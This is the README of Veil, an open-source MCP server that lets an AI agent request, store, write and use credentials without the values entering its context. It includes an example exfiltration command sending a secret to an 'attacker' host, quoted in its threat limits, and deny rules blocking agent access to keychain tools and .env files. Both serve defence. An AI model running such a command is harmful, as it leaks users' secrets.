<div align="center">

**English** · [Español](README.es.md)

<img src="docs/assets/hero-en.svg" width="100%" alt="Animation: the agent asks for a token with metadata only, a local form opens, you type the secret (shown as dots), the value goes straight to .env, SSH, SQL or an API, and the agent only receives {stored:[&quot;MP_ACCESS_TOKEN&quot;]}.">

# Veil

**Let an AI agent ask for, store and use credentials — without ever seeing them.**

[![CI](https://github.com/asteby/veil/actions/workflows/ci.yml/badge.svg)](https://github.com/asteby/veil/actions/workflows/ci.yml) [![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE) [![Node ≥ 20.11](https://img.shields.io/badge/node-%E2%89%A5%2020.11-339933?logo=node.js&logoColor=white)](package.json) [![MCP server](https://img.shields.io/badge/MCP-stdio%20server-6f42c1)](https://modelcontextprotocol.io)

[Threat model](THREAT-MODEL.md) · [Security policy](SECURITY.md) · [Changelog](CHANGELOG.md)

</div>

**Veil** (`@asteby/veil`) is an open-source [Model Context Protocol](https://modelcontextprotocol.io) server (stdio, TypeScript). The agent sends **only metadata** (a form schema); you type the values in a page served on `http://127.0.0.1`; they go straight to a destination you allowlisted. The agent gets back names and statuses, never values.

## Why

- **Secrets pasted into a chat stay in the chat.** Once a key is in the conversation it is part of the model's context and of whatever the client stores. Veil keeps the value on a local page and out of the conversation.
- **Agents need to *use* credentials, not read them.** The agent writes `${secret:NAME}`; the server resolves it inside its own process at the moment of use, after you approve the literal action, and scrubs the output.
- **Real work is more than one API key.** Price lists pasted from a spreadsheet, customer data, SSH keys for a new server, a token that has to end up in a production `.env`, an encrypted backup of everything, a key shared with a teammate's agent: all with the same flow and an audit trail.

**Without Veil**

```text
You:   here's the token: APP_USR-4821-…-9f3c
Agent: Thanks! Writing it to /etc/acme.env:
       MP_ACCESS_TOKEN=APP_USR-4821-…-9f3c

↳ the value is now in the model's context
  and in the conversation history.
```

**With Veil**

```text
Agent: secret_request({fields:[{name:"MP_ACCESS_TOKEN"}]})
       → a local page opens; you paste the token there
Agent: ← {status:"completed", stored:["MP_ACCESS_TOKEN"]}
Agent: secret_write({name:"MP_ACCESS_TOKEN",
         target:{kind:"env-file", host:"prod-vps", …}})
       → you approve the exact write
Agent: ← {written:true, keys:[{key:"MP_ACCESS_TOKEN", action:"updated"}]}
```

## How it works

<img src="docs/assets/how-it-works-en.svg" width="100%" alt="Three lanes. What the model sees: secret_request with a schema, nothing while you type, {stored:[names]}, ${secret:NAME} and redacted output. What you see: the local page, the secret field, the destination, the approval of the literal action. What the MCP server does: renders the form, receives the value, writes it to .env/SQL/SSH/API, resolves it at use time and scrubs the output. Values never cross the glass line into the model lane.">

1. The model calls a tool with metadata only. Destinations, hosts, paths, tables and sites must be in **your** config (allowlist).
2. A one-time link `http://127.0.0.1:<port>/p/<256-bit token>` reaches you via **MCP URL elicitation** when the client supports it (otherwise it is returned for the client to show, and opened with `xdg-open`/`open` if `ui.openBrowser`). The first browser that opens it binds it with an HttpOnly cookie; it expires in 10 min.
3. You fill in or approve. CSRF token + Origin/Host checks + strict nonce CSP; nothing third-party; no autocomplete.
4. Values go to the destination from this process (stdin/env, never argv; never logged).
5. Tool results are structural; a final scrub removes any handled value and its encodings.
6. Every use is audited (hash-chained JSONL). `veil verify-audit` checks the chain.

## Capabilities

| | Capability | Tools | What the model gets |
|---|---|---|---|
| <img src="docs/assets/icons/form.svg" width="20" height="20" alt=""> | **Blind forms** — secrets, or rich schemas: sections, number/money/date/select/multiselect/boolean/file, `showIf`, repeatable tables with CSV / spreadsheet paste, preview | `secret_request`, `blind_input`, `blind_input_preview`, `secret_wait` | `{stored:[names]}`, `{rows_written, ids}`, `{field, code}` errors |
| <img src="docs/assets/icons/approve.svg" width="20" height="20" alt=""> | **Use without seeing** — `exec` / `http` with `${secret:NAME}`, approval page shows the literal action | `secret_use` | exit code / HTTP status + **redacted** output |
| <img src="docs/assets/icons/capture.svg" width="20" height="20" alt=""> | **Web capture** — a Chromium window owned by the server; you log in, it extracts the value DOM → store | `web_capture`, `web_login` | `{stored:[name]}` or `{failed_step, error_code}` — never page text |
| <img src="docs/assets/icons/key.svg" width="20" height="20" alt=""> | **SSH keys** — generate, install with a one-time password, test, run commands | `ssh_key_provision`, `ssh_exec` | fingerprints, access test, redacted output |
| <img src="docs/assets/icons/write.svg" width="20" height="20" alt=""> | **Write to where it's needed** — `.env` (local or over SSH), JSON/YAML, systemd, GitHub Actions secrets, clipboard; form sinks to SQL (Postgres), HTTP APIs, files | `secret_write`, `blind_input` sinks | `{written, target, keys:[{key, action}]}` |
| <img src="docs/assets/icons/stores.svg" width="20" height="20" alt=""> | **Stores** — OS keychain, Veil's own encrypted store (master password, no install needed), encrypted file (AES-256-GCM), `.env`, file over SSH, Vault KV v2, Infisical, 1Password Connect, OPS | `secret_list`, `secret_delete`, `secret_rotate`, `local_unlock` | names + metadata (created, last used, expiry, rotation due) |
| <img src="docs/assets/icons/sync.svg" width="20" height="20" alt=""> | **Encrypted backup & sync** — envelope-encrypted bundle to a folder, SSH, private git repo, S3/R2, WebDAV or HTTP; anti-rollback, conflict detection, key rotation | `vault_export`, `vault_sync`, `vault_import`, `vault_rekey` | counts and names |
| <img src="docs/assets/icons/share.svg" width="20" height="20" alt=""> | **Share by token** — chosen secrets, expiry, max views, optional passphrase; the token is shown only on the local page | `share_create`, `share_list`, `share_revoke`, `share_import` | `{share_id, names, expires_at, max_views}` |
| <img src="docs/assets/icons/env.svg" width="20" height="20" alt=""> | **Encrypted `.env` files** — per-value encryption that stays git-friendly; use them in commands and writes without decrypting to disk | `env_status`, `env_unlock`, `env_encrypt`, `env_edit`, `env_diff`, `env_rotate` | key names, recipients, which keys changed |
| <img src="docs/assets/icons/doctor.svg" width="20" height="20" alt=""> | **Zero-config setup** — diagnostics with the exact fix per OS/distro, actionable errors in English and Spanish | `doctor` | checks + fix commands (never secrets) |

## What it looks like

Real screenshots of the local pages, regenerated with Playwright from the actual UI (sample data: “Acme Store”). They follow your GitHub theme.

<p align="center"><img src="docs/assets/flow-en.webp" width="760" alt="Recording: the token is typed as dots, Save securely, then an approval page to write it into a .env file, Approve."></p>

<table>
<tr>
<td width="50%" valign="top"><b>Secret form</b><br>
<picture><source media="(prefers-color-scheme: dark)" srcset="docs/assets/shots/en/form-dark.webp"><img src="docs/assets/shots/en/form-light.webp" width="100%" alt="Secret form: masked access token, public key, environment select, destination box and Save securely button."></picture></td>
<td width="50%" valign="top"><b>Table pasted from a spreadsheet</b><br>
<picture><source media="(prefers-color-scheme: dark)" srcset="docs/assets/shots/en/table-dark.webp"><img src="docs/assets/shots/en/table-light.webp" width="100%" alt="Repeatable table with four SKU/price rows imported from pasted spreadsheet rows."></picture></td>
</tr>
<tr>
<td valign="top"><b>Approval shows the literal command</b><br>
<picture><source media="(prefers-color-scheme: dark)" srcset="docs/assets/shots/en/approval-dark.webp"><img src="docs/assets/shots/en/approval-light.webp" width="100%" alt="Approval page: secrets involved, cwd, fingerprint, the exact curl command with ${secret:ACME_DEPLOY_TOKEN} and warnings."></picture></td>
<td valign="top"><b>Destination confirmation (SQL upsert, dry run)</b><br>
<picture><source media="(prefers-color-scheme: dark)" srcset="docs/assets/shots/en/destination-dark.webp"><img src="docs/assets/shots/en/destination-light.webp" width="100%" alt="Where these values go: database, the INSERT … ON CONFLICT statement, column mapping, dry run, and the approval checkbox."></picture></td>
</tr>
<tr>
<td colspan="2" align="center"><b>Mobile</b><br>
<picture><source media="(prefers-color-scheme: dark)" srcset="docs/assets/shots/en/mobile-dark.webp"><img src="docs/assets/shots/en/mobile-light.webp" width="300" alt="The same secret form on a phone-sized screen."></picture></td>
</tr>
</table>

## Install in Claude Code

Requirements: Node ≥ 20.11 — nothing else at runtime (pnpm to build from source). Not published to npm yet, so install from a clone:

```bash
git clone https://github.com/asteby/veil && cd veil
pnpm install && pnpm build
claude mcp add veil -- node "$PWD/dist/cli.js"
```

Then ask the agent for something that needs a credential (“set up the payment provider token for production”) and it will open the local page. Once published: `claude mcp add veil -- npx -y @asteby/veil`.

> **Formerly `veilform`.** Nothing to migrate by hand: the `veilform` command stays as an alias, `VEILFORM_*` variables still work (with a deprecation warning; use `VEIL_*`), `~/.config/veilform` is used while `~/.config/veil` does not exist (`veil doctor` shows the `mv`), secrets in the keychain service `veilform` and files written before (encrypted store, bundles, shares, encrypted `.env` with `#/veilform-env v1` / `enc:v1:`) keep opening. Re-register the MCP server under the new name: `claude mcp remove veilform && claude mcp add veil -- node "$PWD/dist/cli.js"`. Details in the [CHANGELOG](CHANGELOG.md).

The OS keychain is used when it works (Linux: `secret-tool` from `libsecret-tools` + GNOME Keyring/KWallet; macOS: the built-in `security`); when it does not, Veil uses its own encrypted store and needs no extra package. Optional, only for the features that use them: `playwright-core` + Chromium for `web_capture`, `psql` for SQL sinks, `gh` for GitHub secrets, OpenSSH for SSH features, `git` for git sync targets. `veil doctor` tells you exactly what is missing and the command to install it.

## First use

```bash
node dist/cli.js init      # once published: npx @asteby/veil init
```

`init` runs the doctor, shows a plan and, after you confirm (`--yes` to skip the question, `--dry-run` to only look), applies **user-level changes only**: it creates `~/.config/veil` (0700), tightens permissions and writes a `config.json` whose default destination **works without installing anything**:

- OS keychain usable → `local` = keychain with `fallback: "auto"` (if the keychain later breaks, values go to Veil's encrypted store).
- OS keychain missing/locked/unsupported → `local` = Veil's encrypted store (`encrypted-file` with `key: {source: "master"}`, file `~/.config/veil/local-vault.json`).

It never runs `sudo` and never asks for a secret. Commands that need privileges (e.g. `sudo apt install -y libsecret-tools`) are printed for you to copy. An optional `postinstall` only prints a hint; set `VEIL_POSTINSTALL=init` to run `init --dry-run` right after installing.

**The encrypted store** is one file in the existing `encrypted-file` format: AES-256-GCM per value (the name is the AAD), key derived with argon2id (Node ≥ 24.7; scrypt N=2^17 otherwise) from a **master password**:

1. The first time a value has to go there, the local page (127.0.0.1) asks you to **define the master password right there** — never in the chat, MCP arguments or argv. You can also do it ahead of time: `veil unlock`, `veil init --master`, or the MCP tool `local_unlock`.
2. Unlocking keeps only the **derived key** in memory: in the session agent (`veil agent`) when it runs — then every Veil process shares it and `veil lock` forgets it — or inside the MCP process, for `localVault.unlockMinutes` (default 15).
3. Later, when the keychain works, you can save the derived key there so the store opens without typing the password: `veil unlock --save-keychain` (`--forget-keychain` undoes it). `veil unlock --change-password` re-encrypts everything under a new password.
4. No plaintext is ever written to disk; values and the master password are registered in the scrub list before anything else and never reach responses, logs or the audit trail.

> **If you forget the master password the data cannot be recovered** — by design, there is no back door. Keep the password in your password manager or on paper, and back up `local-vault.json` (it is useless without the password). For an off-machine encrypted copy use `veil export` / `vault_sync`.

When the default destination is the keychain and it fails during a `secret_request`, the page **offers to continue with the encrypted store** (asking for — or creating — the master password on that same page) instead of failing, and shows the exact command to fix the keychain for good. Set `fallback: "never"` on a keychain destination to forbid that.

<details>
<summary><b>Configuration, environment and hardening</b></summary>

- Configuration is an **allowlist**: copy [`examples/config.example.json`](examples/config.example.json) to `~/.config/veil/config.json` (or let `init` write a minimal one) and keep only what you need. Without a config file there is one destination, `local` (OS keychain, `fallback: "ask"`: the page offers the encrypted store if the keychain fails). Check it with `veil check-config` and `veil doctor`.
- Environment: `VEIL_HOME` (default `~/.config/veil`), `VEIL_CONFIG`, `VEIL_AGENT` (label written to the audit log), `VEIL_KEY_FILE` (key file for encrypted `.env`), `VEIL_POSTINSTALL`.
- Recommended Claude Code hardening (`.claude/settings.json`): deny the agent's own tools access to what this server protects, e.g. `"deny": ["Read(~/.config/veil/**)", "Bash(secret-tool:*)", "Bash(security:*)", "Read(**/.env)"]`.

</details>

## Troubleshooting

Run `veil doctor` (or the read-only MCP tool `doctor`; `--json` for machines). It checks Node/crypto (argon2id), the keychain backend (secret-tool, D-Bus session, Secret Service provider and whether the default keyring is unlocked on Linux; `security` on macOS; on Windows the Credential Manager backend is planned and the encrypted store is used), the default destination, the encrypted store and session agent, permissions of `~/.config/veil`, and ssh/git/gh/psql/Chromium for the features that use them. Every problem lists its impact and the exact command for your distribution (apt, dnf, pacman, zypper, apk, brew, winget). It runs nothing privileged and asks for nothing secret.

Errors are structured — `{error, code, help:{en,es}, fix:{en,es,command, alternative}}` — in MCP responses, and translated on the local page:

| Code | Meaning | Fix |
|---|---|---|
| `keychain_unavailable` | `secret-tool` not installed (`reason: missing_tool`), no D-Bus session (`no_dbus`, SSH/headless) or no Secret Service (`no_service`) | `sudo apt install -y libsecret-tools` (or dnf/pacman/…), `dbus-run-session -- $SHELL`, `gnome-keyring-daemon --start --components=secrets` — or `veil init` |
| `keychain_locked` | the keyring is locked / waiting for an unlock prompt | unlock "Login" in Passwords and Keys (`seahorse`); macOS: `security unlock-keychain` |
| `keychain_unsupported` | no keychain backend on this OS yet (Windows) | `veil init` (encrypted store) |
| `passphrase_required` | the encrypted store is locked | MCP `local_unlock` or `veil unlock` |
| `master_password_not_set` | the encrypted store has no master password yet | define it on the local page (`veil unlock`) |
| `destination_not_configured` | the destination is not in `config.json` | `veil init` or add it |
| `wrong_key` / `too_many_attempts` | wrong master password / temporary lockout after 5 failures | try again later |

## Sync, sharing and encrypted `.env` files

Every result is names, counts and ids only; passphrases and tokens are typed or shown on the local page.

**Bundle** (`manifest.json` + `o/<random id>` per secret, or one `.vfb` file): one random AES-256-GCM data key (DEK) per secret, wrapped by a KEK = HKDF(argon2id/scrypt(passphrase) ‖ optional key file / keychain secret). Names and metadata live only in the encrypted index; the header (format version, bundle id, monotonic `seq`, key parameters, sha256 of each object) is the AAD of the index, so swapped, truncated, edited or older (rollback) bundles are rejected. Each secret carries a vector clock: `vault_sync` never overwrites a concurrent change silently (`strategy`: `report`, `keep-local`, `take-remote`, `keep-both`). CLI: `veil export|import|sync|rekey`.

**Targets** (`sync.targets` in the config, allowlist): `dir`, `ssh` (host from `ssh.hosts`), `git` (private repo; `git` spawned by argv, credentials from your ssh-agent/credential helper), `s3` (S3/R2/MinIO, built-in SigV4), `webdav`, `http`. Credentials for targets are references to the local store (`tokenRef`, `accessKeyRef`…), never inline.

```json
"sync": {
  "targets": { "r2": { "type": "s3", "endpoint": "https://<account>.r2.cloudflarestorage.com", "bucket": "vault", "accessKeyRef": "R2_ID", "secretKeyRef": "R2_SECRET" },
               "repo": { "type": "git", "url": "git@github.com:me/vault-backup.git" } },
  "secondFactor": { "type": "key-file", "path": "~/.config/veil/sync.key" },
  "shareTarget": "r2"
}
```

**Share token** = `vfs1://<target>/<share_id>#<key>` — the key is in the URL fragment (never sent to any server). The bundle is encrypted with HKDF(key ‖ argon2id(passphrase)) when `require_passphrase`; expiry and max views are inside the authenticated header. A person opens it with `veil share open` (local page, token in the fragment or pasted, values hidden again after N s); another agent uses `share_import({token_file})` and then `secret_use`.

**Encrypted `.env`** (`#/veil-env v1` header, `KEY="veil:1:…"` per value, comments/order kept, whole-file MAC, N recipients). `secret_use({env_file})` and `secret_write({from:{kind:"env-enc"}})` use them without the model seeing values:

```bash
veil env keygen ~/.config/veil/keys/myapp.key                 # 0600, outside the repo
veil env encrypt .env.production --key-file ~/.config/veil/keys/myapp.key  # + passphrase on TTY
veil env hook install                                         # pre-commit refuses plaintext .env
veil run --env .env.production -- node server.js              # values only in the child env; output redacted
veil env unlock .env.production --status                      # which unlock methods work here (no values)
veil env share .env.production --expires 1h --max-views 1     # token that unlocks ONLY this file
```

Unlock methods: key file (`--key-file`, `VEIL_KEY_FILE`, `env.keyFiles`), OS keychain (`env.keychain`), systemd credential (`LoadCredential=veil-key:…`, see [`examples/systemd/`](examples/systemd/)), session agent (`veil agent`, `veil lock`), passphrase (TTY or local page, attempts limited), share token. Limits and comparison with age/sops/1Password/Vault: [THREAT-MODEL.md §8](THREAT-MODEL.md#8-sync-sharing-and-encrypted-env-files).

## Examples

**Stripe key, then a call:** `secret_request({title:"Stripe", fields:[{name:"STRIPE_KEY", label:"Secret key", pattern:"sk_(live|test)_[A-Za-z0-9]+"}]})` → you paste it in the local page → `{stored:["STRIPE_KEY"]}` → `secret_use({action:"http", method:"GET", url:"https://api.stripe.com/v1/balance", headers:{Authorization:"Bearer ${secret:STRIPE_KEY}"}})` → the approval page shows exactly that request → `{http_status:200, body:"…"}` (the key is redacted if the API echoes it).

**Token to a production `.env` over SSH:** `secret_write({name:"MP_ACCESS_TOKEN", target:{kind:"env-file", host:"prod-vps", path:"/etc/myapp/myapp.env", key:"MP_ACCESS_TOKEN"}, dry_run:true})` → `{changes:[{key:"MP_ACCESS_TOKEN", action:"updated"}]}`. Without `dry_run`, after your approval, the server reads the remote file over SSH, changes only that key (comments and other keys kept), uploads it on stdin to a temp file, `chmod 0600`, optional `chown`/backup, and `mv` atomically.

**Capture a token from a web panel without the model seeing it:** `web_capture({site:"mercadopago", name:"MP_ACCESS_TOKEN", steps:[…], extract:{selector:"[data-testid=access-token]", regex:"(APP_USR-[\\w-]+)"}})` — a Chromium window owned by this server opens; **you** log in (password/2FA never touch the model); you can edit the steps on the approval page; the value goes DOM → store.

**SSH key for a new VPS:** `ssh_key_provision({host:"prod-vps", alias:"deploy_key", password:true})` → the page shows the host-key fingerprint to compare with your provider, asks the one-time root password, installs the public key, tests access. Then `ssh_exec({host:"prod-vps", command:"systemctl restart myapp"})`.

**Batch of USD prices into Postgres:** `blind_input` with a repeater `rows:[sku, price(money USD)]` and sink `{type:"sql", database:"appdb", table:"public.product_prices", mode:"upsert", rows:"rows", columns:{…}, dry_run:true}`. You paste the rows from a spreadsheet; values travel as `COPY … FROM STDIN` data into a typed temp table and `INSERT … SELECT` in one transaction (never as SQL text).

**Sensitive customer data:** `blind_input` with `name, email, tax id (pattern), phone` and an `http` sink to your CRM; the model receives only the created ids.

**Back up and hand over a key:** `vault_sync({target:"r2"})` → you type the backup passphrase on the local page → `{target:"r2", pushed:{seq:7, count:12}}`. Then `share_create({names:["STRIPE_KEY"], expires_in:"1h", max_views:1})` → the token appears only on your page; your teammate's agent runs `share_import({token_file})` and uses it with `secret_use`.

## Security

**What it protects**

- Values never enter the model's context: tool results are structural (names, statuses, counts, ids, error codes), and a last-line scrub removes any handled value and its common encodings. Property tests check that tool responses, the JSON-RPC wire, the audit log and stderr never contain the value.
- Values never go into argv of spawned processes (stdin, env, FIFOs instead) or into logs.
- The local page is single-use, bound to `127.0.0.1`, with CSRF, Origin/Host and DNS-rebinding checks and a strict CSP; model-provided text is rendered with `textContent` only.
- Every **new** action (command, HTTP request, write target, sink, SSH command, capture plan) needs a click on a page that shows it literally. “Remember” is keyed to the exact fingerprint; any change asks again.
- Backups, shares and encrypted `.env` files are authenticated end to end (AES-256-GCM, argon2id/scrypt, anti-rollback); storage targets only see opaque blobs. Passphrases and the master password are typed only on the local page or a TTY.

**What it does not protect** (read the [threat model](THREAT-MODEL.md))

- An action **you approve** that sends or transforms the value (`curl https://attacker/?k=${secret:X}`). The approval page shows the literal action and warns on shells and network/encoding tools, but you decide.
- Malware or an agent with an unrestricted shell running as **your OS user**: it can read the keychain and the files Veil writes. Restrict the agent's tools (see the hardening above) or sandbox it.
- **A browser the model can see** (browser extension, Playwright MCP, computer use) opening a page that shows a secret. Use `web_capture`, which returns nothing but status.
- A share token or master password that leaks, or one you forget (no recovery by design); revoking a share does not make a reader forget — rotate.
- Redaction is heuristic: very short values and exotic encodings are not detected. JavaScript strings cannot be zeroised.

## How it compares

Other good tools attack nearby problems. They are often complementary rather than alternatives. Descriptions are based on each project's public documentation; check it for current details.

| Approach | What it solves well | Where Veil fits |
|---|---|---|
| **Password managers / 1Password** (`op run`, `op://` references, Connect) | Storing and sharing secrets for people and teams, policies, rotation. 1Password has [publicly stated](https://1password.com/blog/where-mcp-fits-and-where-it-doesnt) it will not expose raw credentials through MCP and favours injecting them on the agent's behalf. | Veil can use **1Password Connect as a destination**: you type the value in the local form and it is written there server to server. |
| **HashiCorp Vault / Infisical** | Central secret storage with access policies, audit, leases and (in Vault) dynamic secrets. | Also **destinations** (`vault-kv2`, `infisical` adapters). Veil adds the human intake step and per-action approval for agent-driven use. |
| **Encrypted config in git** (sops, age, dotenvx) | Committing encrypted secrets next to the code, with team recipients and CI decryption. | Veil's encrypted `.env` is similar in spirit; the difference is that the agent edits, diffs and runs with it **without the values entering its context**. Details in [THREAT-MODEL.md §8.3](THREAT-MODEL.md#83-comparison). |
| **Injection proxies and brokers** for agents (e.g. [OneCLI](https://github.com/onecli/onecli), [BlindKey](https://github.com/leocelis/blindkey)) | The agent uses placeholders and a gateway/broker swaps in the real credential when the request leaves; well suited to frequent API calls. | Focuses on getting values **in** (forms, tables, web capture, SSH keys) and **out to places** (`.env` over SSH, SQL, GitHub secrets), each with a literal approval. A proxy can handle high-volume runtime calls alongside it. |

## Development

```bash
pnpm install
pnpm typecheck && pnpm lint && pnpm test   # vitest: unit, property, simulated APIs, sshd loopback, Postgres (docker) if available
pnpm test:e2e                              # Playwright: forms, approval, setup/fallback, share reveal, encrypted .env edit
```

README visuals: `node scripts/readme-assets/make-svgs.mjs` (animated SVGs and icons) and `npx playwright test --config scripts/readme-assets/playwright.config.ts` (screenshots and recording from the real UI; needs ffmpeg with libwebp).

Deviations from the original design brief (documented): the keychain uses the platform CLIs instead of `@napi-rs/keyring` (no native addon); `encrypted-file` uses Node's AES-256-GCM + scrypt/argon2id instead of age/libsodium; property tests use a small seeded PRNG instead of `fast-check`. All three because the build had to work offline with the cached dependencies, and they keep the runtime dependency list to the MCP SDK and zod.

## License

[MIT](LICENSE)
